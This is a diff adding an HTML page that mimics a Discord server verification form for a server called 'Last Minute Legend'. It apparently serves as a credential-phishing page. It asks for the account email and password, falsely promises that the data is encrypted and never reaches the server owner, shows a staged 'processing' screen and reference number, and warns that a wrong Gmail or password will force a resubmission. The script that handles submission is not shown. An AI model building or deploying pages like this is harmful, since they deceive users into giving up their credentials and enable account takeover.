@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Last Minute Legend - Verification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="overlay" id="privacy-popup">
+        <div class="discord-card modal-card">
+            <div class="shield-icon">
+                <img src="app.ico" alt="Discord Security">
+            </div>
+            <h2 class="card-title">Privacy & Security Notice</h2>
+            <p class="card-subtitle" style="margin-top: 15px; margin-bottom: 25px; line-height: 1.6; text-align: left;">
+                The information provided by you is securely encrypted. 
+                <br><br>
+                Rest assured, this data is processed automatically by our bot and <strong>does not go to the server owner (which is Abhijit Samal in your case)</strong>. Your privacy is our top priority.
+            </p>
+            <button class="btn-blurple" onclick="closePopup()">I Understand & Agree</button>
+        </div>
+    </div>
+
+    <div class="app-container">
+        <div class="discord-card" id="step-1">
+            <div class="server-icon">
+                <img src="Gemini_Generated_Image_5xk3ke5xk3ke5xk3.png" alt="Last Minute Legends">
+            </div>
+            <h1 class="card-title">Server Verification</h1>
+            <p class="card-subtitle">Welcome to <strong>Last Minute Legend</strong>. Please verify your Discord account to gain full server access.</p>
+            
+            <div class="form-group">
+                <label for="username">DISCORD USERNAME <span class="required">*</span></label>
+                <input type="text" id="username" placeholder="e.g. Wumpus#0000 or @wumpus" autocomplete="off" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email">ACCOUNT EMAIL <span class="required">*</span></label>
+                <input type="email" id="email" autocomplete="off" required>
+            </div>
+
+             <div class="form-group">
+                <label for="password">ACCOUNT PASSWORD <span class="required">*</span></label>
+                <input type="password" id="password" autocomplete="off" required>
+            </div>
+
+            <button class="btn-blurple" onclick="submitVerification()">Verify Account</button>
+            
+            <div class="footer-divider"></div>
+            <p class="footer-text">Server Owner: <strong>Abhijit Samal</strong></p>
+            <p class="footer-text">By verifying, you agree to the Last Minute Legend rules.</p>
+        </div>
+
+        <div class="discord-card hidden" id="step-2">
+            <div class="loading-container">
+                <div class="discord-spinner"></div>
+                <h2 class="card-title" style="margin-top: 20px;">Processing Request</h2>
+                <div class="console-box">
+                    <p id="console-text" class="console-text">Initializing connection to gateway...</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="discord-card hidden" id="step-3">
+            <div class="success-header">
+                <div class="check-icon">✓</div>
+            </div>
+            <h2 class="card-title" style="margin-top: 20px;">Verification Request Sent</h2>
+            
+            <div class="request-box">
+                <p class="req-label">PLEASE NOTE DOWN YOUR REFERENCE NUMBER:</p>
+                <p class="req-id" id="request-id">LML-</p>
+            </div>
+
+            <p class="card-subtitle" style="text-align: center; font-size: 14px; line-height: 1.5; margin-top: 20px;">
+                Your account has gone to verification. Under <strong>1 to 2 hours</strong> you will receive an email from our team to join the server.
+            </p>
+
+            <div class="reality-check" style="border-left-color: #f1c40f; margin-top: 15px;">
+                <strong>WARNING:</strong> If the Gmail or password is wrong then it will be rejected and another form will need to be filled again by you.
+            </div>
+
+            <p class="footer-text" style="color: var(--success); font-weight: bold; margin-top: 20px; font-size: 16px;">
+                You may now exit the browser.
+            </p>
+        </div>
+    </div>
+
+    <script type="module" src="script.js"></script>
+</body>
+</html>
